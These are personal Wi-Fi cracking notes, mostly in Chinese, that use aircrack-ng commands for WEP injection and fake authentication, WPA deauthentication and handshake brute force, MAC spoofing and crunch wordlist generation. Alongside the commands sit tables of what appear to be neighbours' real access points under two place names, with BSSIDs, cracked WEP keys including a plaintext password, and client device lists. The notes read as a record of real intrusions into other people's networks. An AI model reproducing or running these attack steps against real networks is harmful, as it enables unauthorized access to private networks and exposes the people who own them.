安装

sudo apt-get install aircrack-ng

开始监听

airmon-ng start eth0 1
//airmon-ng start wlan0 1

网络状态检查
ifconfig
iwconfig

扫描
airodump-ng mon0

破解wep

	开始抓包
	
	airodump-ng -c 13 -w 5a862c --ivs mon0
AB:CD:E1:23:45
	建立虚拟连接
	sudo aireplay-ng -1 0 -a 00:27:19:5A:86:2C -h 00:14:A5:B5:88:D2 mon0

	sudo aireplay-ng --fakeauth 5 -o 10 -q 1 -a 00:27:19:5A:86:2C -h 00:14:A5:B5:88:D2 mon0

	自动注入
	sudo aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b 00:27:19:5A:86:2C -h 00:14:A5:B5:88:D2 mon0

	aireplay-ng -1 6000 -o 1 -q 10 -a 00:23:CD:EB:CE:8C -h 00:14:a5:b5:88:d2 mon0		
	
	破解
	aircrack-ng 1003*.ivs

		fragmentation产生xor
		sudo aireplay-ng -5 -b 00:21:27:B0:D7:46 -h 00:14:a5:b5:88:d2 mon0

			chopchop攻击产生xor
			sudo aireplay-ng -4 -h 00:14:a5:b5:88:d2 -b 00:21:27:B0:D7:46 mon0

		用xor建立APR	
		packetforge-ng -0 -a 00:23:CD:9A:B8:AA -h 00:14:a5:b5:88:d2 -k 255.255.255.255 -l 255.255.255.255 -y fragment-1226-204342.xor -w arp-request

		抓包
		airodump-ng -c 9 --bssid 00:23:CD:9A:B8:AA -w capture mon0
	
		注入ARP
		aireplay-ng -2 -r arp-request mon0	
	
		破解
		aircrack-ng -b 00:23:CD:25:45:0E capture*.cap 

破解wpa

airodump-ng -c 13 --bssid D8:5D:4C:2D:94:50 -w ying mon0
aireplay-ng -0 1 -a D8:5D:4C:2D:94:50 -c 00:26:C7:22:2C:A8 mon0
aircrack-ng -w 8_num.lst -b D8:5D:4C:2D:94:50 ying*.cap

python -c "for n in xrange(0, 99999999): print '%08d' % n" | aircrack-ng  -w - -b D8:5D:4C:2D:94:50 ying*.cap

(This will try every 8 digit integer from 0 to 99999999 as key. YMMV, since the keyspace here is 100000000 keys. On a relatively recent Core 2 Duo chip, I get about 1150 keys/sec so it would take just over 24 hours to run.)

修改MAC地址

ifconfig mon0 down

	随机地址 
	macchanger -a mon0
	Current MAC: 00:0f:b5:88:ac:82 (Netgear Inc)
	Faked MAC:   00:b0:80:3b:1e:1f (Mannesmann Ipulsys B.v.)
 
	指定地址
	macchanger -m 00:06:12:25:77:74 mon0
		
ifconfig mon0 up
macchanger -s mon0
Current MAC: 00:b0:80:3b:1e:1f (Mannesmann Ipulsys B.v.)


airoscript相关

sudo gedit /usr/local/etc/airoscript.conf

sudo gedit /usr/local/share/airoscript/airoscfunc.sh

修改本机名

sudo gedit /etc/hostname

地址列表
00:14:a5:b5:88:d2 wlan0 （nx6325)
00:06:25:02:FF:D8 fake

桂江里
00:21:27:36:D6:86 wang 77:7A:79:77:7A:79:77:7A:79:77:7A:79:77 wzywzywzywzyw                            
00:1D:0F:81:92:DA 4284         
00:23:CD:25:45:0E TP-LINK_25450E 13:57:92:46:80 15:82:29:19:53
00:23:CD:9A:B8:AA MERCURY_9AB8AA 84:84:84:84:84
00:18:4D:81:10:9E viva
00:25:86:79:79:66 TP-LINK_WHR
00:21:27:35:F9:DE TP-LINK	 14:72:58:36:90
00:23:CD:EB:CE:8C TP-LINK_EBCE8C 
	00:E0:4C:6B:AF:2E
	20:7C:8F:08:70:F1
	00:E0:4C:8F:89:70
00:23:CD:17:2C:40 TP-LINK_172C40 
	00:C0:CA:39:BF:EF
	00:E0:4C:93:10:0E
00:27:19:59:46:8E TP-LINK_59468E  1111111111
00:22:3F:17:0D:C8 NETGEAR   
00:23:CD:3E:39:B2 TP-LINK_3E39B0 13:82:18:78:97                                 
00:21:27:B0:D7:46 TP-LINK_B0D746                                                     
00:23:CD:4E:27:AC %u79C1%u4EBA%u7F51%u7EDC                                           
00:1D:0F:2A:0D:F2 laotianye 20:05:12:04:04                                             
00:26:B6:2E:7E:93 <length:  0>
00:23:CD:3A:B6:6C <length:  0> 
00:27:19:5A:86:2C TP-LINK_5A862C AB:CD:E1:23:45
00:25:86:1F:20:7E  TP-LINK_1F207E  13:82:07:58:05
	00:21:6B:CE:47:32



朝阳新城

#		MAC		CHAN	SECU	POWER	#CHAR		SSID

 1)	00:18:39:84:88:D7	 11	 WEP 	 -77	 7	 linksys
 2)	00:1F:33:B9:74:9E	 11	 WPA2WPA 	 -72	 10	 zxlkingdom
 3)	00:23:CD:28:82:22	 12	 WEP 	 -73	 6	 Singer
 4)	00:19:E0:C5:17:8E	 6	 WEP 	 -74	 7	 TP-LINK
31:32:33:34:35     12345
 5)	00:1D:0F:2A:A5:20	 6	 OPN 	 -75	 7	 TP-LINK
 6)	00:B0:0C:01:E2:B8	 6	 WPA 	 -75	 5	 Tenda
 7)	00:22:B0:F5:E2:E4	 6	 WEP 	 -74	 12	 Tony!/s link 12:34:56:78:9A
 8)	00:14:78:E3:5A:8A	 6	 WEP 	 -72	 7	 JWSHOME  6A:69:61:6F:7A:68:75:4A:75:6E:21:40:23   jiaozhuJun!@#
 9)	00:24:01:1E:31:5C	 133	 WEP 	 -1	 0	
 10)	00:19:5B:E6:9E:4A	 133	 WEP 	 -1	 0	


00:23:CD:25:45:0E 用户列表
ID	MAC地址	当前状态	接收数据包数	发送数据包数
1	00-23-CD-25-45-0E	启用	1296000	1323208
2	00-16-E3-A9-49-FE	连接	139043	131443
3	00-30-95-D2-08-E3	连接	3857	3368
4	00-1C-BF-9F-B6-5A	连接	28763	30552
5	00-22-FA-9A-60-94	连接	143119	140441

NETGEAR 用户列表 

00:1E:2A:41:5C:34




00:27:19:5A:86:2C 的客户 70:1A:04:BA:F5:EF
D8:5D:4C:2D:94:50 的客户 00:26:C7:22:2C:A8

aireplay-ng -1 6000 -o 1 -q 10 -e TP-LINK_EBCE8C -a 00:23:CD:EB:CE:8C -h 00:14:a5:b5:88:d2 mon0
aireplay-ng -1 0 -e TP-LINK_EBCE8C -a 00:23:CD:EB:CE:8C -h 00:14:a5:b5:88:d2 mon0
00:0c:D6:A6:61:AD



-------------------------------------------------------------------

./crunch

./crunch 1 8 0123456789 -o 8_num.lst

制作一个从0开头99999999结尾的字典，文件名为8_num.lst

usage: crunch <min-len> <max-len> [charset] [-o wordlist.txt] [-t [FIXED]@@@@] [-s startblock] [-c number]
or
usage: crunch <min-len> <max-len> [-f <path to charset.lst> charset-name] [-o wordlist.txt] [-t [FIXED]@@@@] [-s startblock] [-c number]

min-len is the minimum length string you want crunch to start at
max-len is the maximum length string you want crunch to end at

[charset] is optional.  You may specify a character set for crunch to use on the command line or if you leave it blank crunch will use abcdefghijklmnopqrstuvwxyz as the character set.  NOTE: If you want to include the space character in your character set you use enclose your character set in quotes i.e. "abc "

[-f <path to charset.lst> <charset-name>] is the alternative to setting the character set on command line.  This parameter allows you to specify a character set from the charset.lst.
NOTE: You may either not specify a charset, you may specify a character set on the command line, or you may specify -f <path to charset.lst> <charset-name>.  You can only do one.

[-t [FIXED]@%^] is optional and allows you to specify a pattern, eg: @@god@@@@ where the only the @'s will change.  You can specify @ or % or ^  which will allow to change letters numbers and symbols.  For example @@dog%^ abcd 1234 @#$% the @'s will chnage with the characters the % will change with the numbers and the ^ will change with the symbols you specifed.  If you use %dog^ + 1234 @#$% the plus sign is a placeholder.

[-s startblock] is optional and allows you to specify the starting string, eg: 03god22fs

[-i] is optional and will invert the output.  Instad of aaa, aab, aac you will get aaa, baa, caa, etc

[-o wordlist.txt] is optional allows you to specify the file to write the output to, eg: wordlist.txt

[-c number] is optional and specifies the number of lines to write to output file, only works if -o START is used, eg: 60  The ouput files will be in the format of starting letter-ending letter for example:
 ./crunch 1 1 -f /pentest/password/crunch/charset.lst
 mixalpha-numeric-all-space -o START -c 60
 will result in 2 files: a-7.txt and 8-\ .txt  The reason for the slash in  the second filename is the ending character is space and ls has to escape it to print it.  Yes you will need to put in the \ when specifing the filename.

[-b size] is optional and will break apart the output file based on the size you specify.  you must specify the size as a number followed by kb, mb, gb, kib, mib, or gib.  kb, mb, and gb are based on the power of 10 (i.e. 1 kb = 1000 bytes).  kib, mib, and gib are based on the power of two (i.e. 1 kb = 1024 bytes).  To use this option you must specify -o START.  NOTE There is no space between the number and the type.  For example 500mb is correct, 500 mb is NOT correct.

[-z option] is optional and will compress the outfile using bzip, gzip, or lzma

[-p string-of-letters] is optional crunch will now generate permutations instead of combinations.  The string of letters is the string of letters you use to permute.  This parameter ignores min and max

[-m string1 string2 string3 ...] is optional crunch will now generate permututions of the strings you specify.  This parameter ignores min and max

[-r] is optional and resume a previous crunch session.  You must use the same syntax as the original command.  This option will not work with the -p or -m options.

examples:
./crunch 1 8
crunch will display a wordlist that starts at a and ends at zzzzzzzz

./crunch 1 6 abcdefg
crunch will display a wordlist using the charcterset abcdefg that starts at a and ends at gggggg

./crunch 1 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt
crunch will use the mixalpha-numberic-all-space character set from charset.lst and will write the wordlist to a file named wordlist.txt.  The file will start with a and end with "        "

./crunch 8 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt -t @@dog@@@ -s cbdogaaa 
crunch will generate a 8 character wordlist using the mixalpha-number-all-space characterset from charset.lst and will write the wordlist to a file named wordlist.txt.  The file will start at cbdogaaa and end at "  dog   "


--------------------------------------------------------------------------------------------------------------------------------------------

2010-07-07 [09:54:44] 6035628 keys tested
00000000-06035624     



